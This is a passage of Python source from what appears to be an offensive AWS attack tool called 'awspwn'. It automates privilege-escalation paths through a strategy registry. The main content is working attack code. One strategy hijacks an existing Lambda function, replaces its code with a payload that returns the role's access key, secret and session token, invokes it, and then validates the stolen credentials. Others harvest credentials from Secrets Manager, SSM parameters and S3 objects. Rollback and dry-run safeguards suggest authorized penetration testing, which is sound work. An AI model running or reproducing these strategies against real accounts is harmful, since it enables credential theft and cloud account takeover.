    account = sts_arn.split(":")[4] if sts_arn.count(":") >= 4 else ""
    name = ""
    if ":assumed-role/" in sts_arn:
        name = sts_arn.split(":assumed-role/", 1)[1].split("/", 1)[0]
    return name, account


_PY_IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _exfil_zip_for_handler(handler: str) -> Optional[bytes]:
    """A ZIP whose module path and function match the function's Handler, returning
    the execution role's ambient credentials from the environment. Returns None
    when the handler cannot be faithfully reproduced (a non-identifier function, or
    a module path we cannot express as files) - the caller then refuses the
    takeover BEFORE mutating, rather than deploying a broken package.

    Lambda's Python handler is `<module.path>.<function>`, where the module path
    uses DOTS as package separators - so `pkg.mod.handler` is the file
    `pkg/mod.py` (with `pkg/__init__.py`), NOT `pkg.mod.py`."""
    module_path, _, func = handler.rpartition(".")
    if not module_path:            # bare "handler" -> conventional index.py
        module_path, func = "index", (func or "handler")
    if not _PY_IDENT.match(func):
        return None
    parts = module_path.split(".")
    if not all(_PY_IDENT.match(p) for p in parts):
        return None
    code = (
        "import os\n"
        f"def {func}(event, context):\n"
        "    return {k: os.environ.get(k) for k in "
        "('AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN')}\n"
    )
    files = {"/".join(parts) + ".py": code}
    for i in range(1, len(parts)):  # __init__.py for each package directory
        files["/".join(parts[:i]) + "/__init__.py"] = ""
    return _zip_named_files(files)


def _zip_named_files(files: dict) -> bytes:
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, code in files.items():
            z.writestr(name, code)
    return buf.getvalue()


def _write_package_backup(engine, fn_name: str, data: bytes) -> Optional[str]:
    """Persist the original deployment package 0600 so a durable ledger rollback
    can reload it from disk. Returns the path, or None on failure."""
    try:
        d = secure_mkdir(loot_dir_path(engine.loot_dir))
        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", fn_name)
        path = str(d / f"lambda-backup-{safe}-{uuid.uuid4().hex[:8]}.zip")
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as f:
            f.write(data)
        return path
    except OSError:
        return None


def _wait_function_updated(lam, fn_name: str) -> None:
    """Block until the code update has finished deploying. Failures PROPAGATE:
    during a destructive overwrite/restore we must not invoke before the deploy
    completes, nor mark a restore reverted if its deploy timed out or failed."""
    lam.get_waiter("function_updated_v2").wait(
        FunctionName=fn_name, WaiterConfig={"Delay": 2, "MaxAttempts": 45})


def _strat_lambda_takeover(engine, client, edge, src, dst, ctx) -> StepResult:
    """Hijack an EXISTING function to steal its execution role. Backs up the
    package, overwrites+invokes to capture creds, restores immediately, verifies
    the captured identity by STS account + role name, and only marks the ledger
    entry reverted once the restore succeeds (else leaves it live for rollback)."""
    p = edge.properties
    fn_name = p.get("function_name") or dst.name
    region = p.get("region") or ctx["REGION"]
    runtime = str(p.get("runtime", ""))
    role_arn = p.get("role_arn") or dst.object_id
    if p.get("package_type", "Zip") == "Image" or not runtime.lower().startswith("python"):
        return StepResult(ok=False, manual=True,
                          note=f"LambdaTakeover supports ZIP/Python only (got {p.get('package_type')}/{runtime})")

    lam = client.client("lambda", region=region)
    try:
        info = lam.get_function(FunctionName=fn_name)
    except Exception as exc:  # noqa: BLE001
        return StepResult(ok=False, note=f"get_function failed: {exc}")
    handler = info.get("Configuration", {}).get("Handler", "") or p.get("handler", "index.handler")
    code_url = info.get("Code", {}).get("Location", "")

    # Build (and thereby VALIDATE) the exfil package BEFORE any mutation - refuse
    # the takeover if we cannot faithfully reproduce this handler's module/function.
    exfil = _exfil_zip_for_handler(handler)
    if exfil is None:
        return StepResult(ok=False, manual=True,
                          note=f"handler '{handler}' cannot be reproduced by the injector - refusing takeover")

    # Back up the ORIGINAL package before mutating - without it, no takeover.
    try:
        original = urllib.request.urlopen(code_url, timeout=30).read()  # noqa: S310 - AWS presigned URL
    except Exception as exc:  # noqa: BLE001
        return StepResult(ok=False, note=f"could not download package to back up - refusing takeover: {exc}")
    backup_path = _write_package_backup(engine, fn_name, original)
    if backup_path is None:
        return StepResult(ok=False, note="could not persist package backup - refusing takeover")

    # Record the RESTORE on the ledger BEFORE overwriting, so a crash between the
    # overwrite and the restore still leaves a rollback that reloads from disk.
    m = engine.record_mutation(
        "lambda:UpdateFunctionCode", {"FunctionName": fn_name, "op": "takeover-overwrite"},
        client.identity.arn, BlastRadius.DESTRUCTIVE,
        undo_api="lambda:UpdateFunctionCode",
        undo_params={"FunctionName": fn_name, "_region": region, "_backup_path": backup_path},
        note="lambda takeover: original package backed up; rollback reloads it from disk",
    )

    try:
        lam.update_function_code(FunctionName=fn_name, ZipFile=exfil)
        _wait_function_updated(lam, fn_name)  # do NOT invoke before the deploy completes
    except Exception as exc:  # noqa: BLE001 - overwrite/deploy failed; ledger entry restores
        return StepResult(ok=False, note=f"update_function_code failed: {exc} (rollback will restore)")

    captured = None
    try:
        resp = lam.invoke(FunctionName=fn_name)
        if not resp.get("FunctionError"):
            data = json.loads(resp["Payload"].read().decode())
            if data and data.get("AWS_ACCESS_KEY_ID"):
                captured = data
    except Exception as exc:  # noqa: BLE001
        engine.log(_dim(f"    invoke failed: {exc}"))

    # Restore ALWAYS, immediately, then reconcile the ledger entry.
    restored = False
    try:
        lam.update_function_code(FunctionName=fn_name, ZipFile=original)
        _wait_function_updated(lam, fn_name)
        restored = True
    except Exception as exc:  # noqa: BLE001
        engine.log(_color(f"    [!] restore failed - left LIVE on the ledger for rollback: {exc}", C.YELLOW))
    if restored:
        m.reverted = True
        engine.mutation_count = max(0, engine.mutation_count - 1)
        save_state(engine.state, engine.loot_dir)
        # The reverted ledger entry no longer needs the on-disk backup.
        try:
            os.remove(backup_path)
        except OSError:
            pass

    if not captured:
        return StepResult(ok=False, note="captured no credentials from the function (package restored)")

    # Verify by STS account + role name (role names are account-unique).
    ident = AwsIdentity(
        access_key=captured["AWS_ACCESS_KEY_ID"], secret_key=captured["AWS_SECRET_ACCESS_KEY"],
        session_token=captured.get("AWS_SESSION_TOKEN", ""), arn=role_arn,
        account=_role_name_account(role_arn)[1], region=region, source="lambda-takeover",
    )
    new = AwsClient(ident)
    try:
        who = new.client("sts").get_caller_identity()
    except Exception as exc:  # noqa: BLE001
        return StepResult(ok=False, note=f"captured creds did not authenticate: {exc}")
    got_name, got_acct = _sts_role_name_account(who.get("Arn", ""))
    want_name, want_acct = _role_name_account(role_arn)
    if got_name != want_name or got_acct != want_acct:
        return StepResult(ok=False,
                          note=f"captured identity {who.get('Arn')} != target role {role_arn} - pivot rejected")
    # Preserve the ACTUAL STS session ARN on the live identity (graph-ID/live-
    # identity separation). roam uses the edge target as the post-pivot graph id;
    # the client keeps the session ARN its credentials really resolve to.
    new.identity.arn = who.get("Arn", role_arn)
    new.identity.account = who.get("Account", want_acct)
    engine.save_captured("role-creds", dst, new.identity, note="captured via Lambda takeover")
    return StepResult(ok=True, new_client=new, captured=[new.identity],
                      note=f"captured {role_arn} via Lambda takeover of {fn_name}")


def _capture_secret(engine, client, edge, src, dst, ctx, value: str, label: str) -> StepResult:
    creds = _extract_aws_creds(value)
    if creds:
        new = _verified_client(creds, ctx, source=f"{label}-embedded-creds")
        if new is not None:
            engine.save_captured("embedded-creds", dst, new.identity, note=f"embedded in {label}")
            engine.log(f"    {_color('[+]', C.GREEN)} embedded AWS credentials found and verified in {label} (saved to loot)")
            return StepResult(ok=True, new_client=new, captured=[new.identity],
                              note=f"captured + verified embedded creds from {label} {dst.label}")
        # Credential-shaped material that did not authenticate - record as loot,
        # but keep walking as the still-valid current identity.
        engine.log(f"    {_color('[!]', C.YELLOW)} credential-like material in {label} did not authenticate - not propagated")
        return StepResult(ok=True, loot=[f"{label}:{dst.label}:unverified-creds"],
                          note=f"found credential-like material in {label} {dst.label} but it did not authenticate")
    return StepResult(ok=True, loot=[f"{label}:{dst.label}"],
                      note=f"read {label} {dst.label} (no embedded AWS creds detected)")


def _strat_get_secret(engine, client, edge, src, dst, ctx) -> StepResult:
    sm = client.client("secretsmanager", region=ctx["REGION"])
    resp = sm.get_secret_value(SecretId=dst.object_id or dst.name)
    value = resp.get("SecretString") or ""
    return _capture_secret(engine, client, edge, src, dst, ctx, value, "secret")


def _strat_read_ssm(engine, client, edge, src, dst, ctx) -> StepResult:
    ssm = client.client("ssm", region=ctx["REGION"])
    resp = ssm.get_parameter(Name=dst.name, WithDecryption=True)
    value = resp.get("Parameter", {}).get("Value", "")
    return _capture_secret(engine, client, edge, src, dst, ctx, value, "ssm-parameter")


def _strat_read_s3(engine, client, edge, src, dst, ctx) -> StepResult:
    """Best-effort: sample small objects and scan them for credentials."""
    s3 = client.client("s3", region=ctx["REGION"])
    bucket = dst.name
    try:
        listing = s3.list_objects_v2(Bucket=bucket, MaxKeys=25).get("Contents", [])
    except Exception as exc:  # noqa: BLE001
        return StepResult(ok=True, loot=[f"s3:{bucket}"], note=f"could not list {bucket}: {exc}")
    for obj in listing:
        if obj.get("Size", 0) > 65536:
            continue
        try:
            body = s3.get_object(Bucket=bucket, Key=obj["Key"])["Body"].read().decode("utf-8", "ignore")
        except Exception:  # noqa: BLE001
            continue
        creds = _extract_aws_creds(body)
        if creds:
            new = _verified_client(creds, ctx, source="s3-embedded-creds")
            if new is not None:
                engine.log(f"    {_color('[+]', C.GREEN)} embedded AWS credentials verified in s3://{bucket}/{obj['Key']}")
                return StepResult(ok=True, new_client=new, captured=[new.identity],
                                  note=f"captured + verified embedded creds from s3://{bucket}/{obj['Key']}")
            engine.log(f"    {_color('[!]', C.YELLOW)} credential-like material in s3://{bucket}/{obj['Key']} did not authenticate")
    return StepResult(ok=True, loot=[f"s3:{bucket}"],
                      note=f"read {len(listing)} object(s) from {bucket}, no verified creds")


def _strat_read_loot(engine, client, edge, src, dst, ctx) -> StepResult:
    """Generic read edge with no in-process capture worth automating - record the
    reachable loot and continue."""
    return StepResult(ok=True, loot=[f"{edge.kind}:{dst.label}"],
                      note=f"reachable via {edge.kind} (read manually with `awspwn info {edge.kind}`)")


def _strat_default(engine, client, edge, src, dst, ctx) -> StepResult:
    """No in-process strategy: render the abuse steps so the operator can run the
    scaffolding-heavy parts by hand, then treat the hop as manual."""
    info = get_abuse_info(edge.kind)
    if info is None or not info.linux_steps:
        return StepResult(ok=False, manual=True, note=f"no strategy or template for {edge.kind}")
    lines = []
    for step in info.linux_steps:
        if step.is_cleanup:
            continue
        lines.append(format_command(step.command, ctx))
    rendered = "\n    ".join("\n    ".join(cmd.splitlines()) for cmd in lines)
    engine.log(_dim(f"    {rendered}"))
    return StepResult(ok=False, manual=True,
                      note=f"{edge.kind} needs out-of-band scaffolding - run the printed steps manually")


# ─── Helpers ─────────────────────────────────────────────────────────────────


def _assume_with_propagation(engine: PwnEngine, client: AwsClient, role_arn: str) -> AwsClient:
    """Assume a role we just modified - IAM changes lag, so retry through the
    eventual-consistency window (AccessDenied is transient here, not final)."""
    def _do():
        new = client.assume_role(role_arn, session_name=engine.session_name)
        new.whoami()
        return new
    return retry_until_consistent(
        _do, treat_access_denied_as_transient=True,
        policy=RetryPolicy(max_wait=40, base=3),
        on_retry=lambda a, d, e: engine.log(_dim(f"    waiting for IAM propagation… (try {a})")),
    )


def _verify_admin(engine: PwnEngine, client: AwsClient) -> None:
    # Best-effort confirmation; failure here is not fatal (propagation lag).
    try:
        retry_until_consistent(
            lambda: client.client("iam").list_attached_user_policies(
                UserName=_principal_user_name(client.identity) or ""),
            treat_access_denied_as_transient=True, policy=RetryPolicy(max_wait=10, base=2),
        )
    except Exception:  # noqa: BLE001
        pass


def _pick_customer_managed(node: Node) -> Optional[str]:
    for arn in node.properties.get("attached_policies", []) or []:
        if arn.startswith("arn:aws:iam::aws:policy/"):
            continue  # AWS-managed policies cannot have versions rewritten
        return arn
    return None


# ─── Registry ────────────────────────────────────────────────────────────────

STRATEGIES: dict[str, Callable] = {
    "EffectiveAdmin": _strat_effective_admin,
    "CanAssume": _strat_assume,
    "AssumeRoleCrossAccount": _strat_assume,
    "AssumeRoleCrossAccountOrg": _strat_assume,
    "OrgManagementAccountAccess": _strat_assume,
    "AttachUserPolicy": _strat_attach_user_policy,
    "PutUserPolicy": _strat_put_user_policy,
    "AttachGroupPolicy": _strat_attach_group_policy,
    "PutGroupPolicy": _strat_put_group_policy,
    "AddUserToGroup": _strat_add_user_to_group,
    "AttachRolePolicy": _strat_attach_role_policy,
    "PutRolePolicy": _strat_put_role_policy,
    "UpdateAssumeRolePolicy": _strat_update_assume_role_policy,
    "CreatePolicyVersion": _strat_create_policy_version,
    "CreateRoleAndAssume": _strat_create_role_and_assume,
    "CreateAccessKey": _strat_create_access_key,
    "CreateLoginProfile": _strat_login_profile,
    "UpdateLoginProfile": _strat_login_profile,
    "CreateLambdaWithRole": _strat_create_lambda,
    "LambdaTakeover": _strat_lambda_takeover,
    "GetSecretValue": _strat_get_secret,
    "ReadSSMParameter": _strat_read_ssm,
    "ReadS3Object": _strat_read_s3,
    "ListS3Bucket": _strat_read_loot,
    "DynamoDBScan": _strat_read_loot,
    "ReadCloudWatchLogs": _strat_read_loot,
    "KMSDecrypt": _strat_read_loot,
    "InvokeLambda": _strat_read_loot,
    "ECRGetLoginPull": _strat_read_loot,
}


# ─── Plan (dry-run) rendering ────────────────────────────────────────────────


def render_plan(path: AttackPath, gates: Gates) -> str:
    """Per-hop preview: strategy, blast radius, and whether the gate would let it
    run - printed instead of executing when `--execute` is absent."""
    lines = [_bold(f"  Execution plan  ({path.length} hop(s))")]
    for i, edge in enumerate(path.edges):
        dst = path.nodes[i + 1]
        info = get_abuse_info(edge.kind)
        blast = info.blast_radius if info else BlastRadius.READ
        tag = _color(blast.value, _BLAST_COLOR.get(blast, C.WHITE))
        in_proc = edge.kind in STRATEGIES
        how = _color("in-process", C.GREEN) if in_proc else _color("manual", C.YELLOW)
        permitted, reason = gates.permits(blast)
        gate = _color("would run", C.GREEN) if permitted else _color(f"BLOCKED ({reason})", C.RED)
        lines.append(f"    {i + 1}. {_color(edge.kind, C.CYAN)} → {dst.label}  [{tag}] {how}  {gate}")
    return "\n".join(lines)
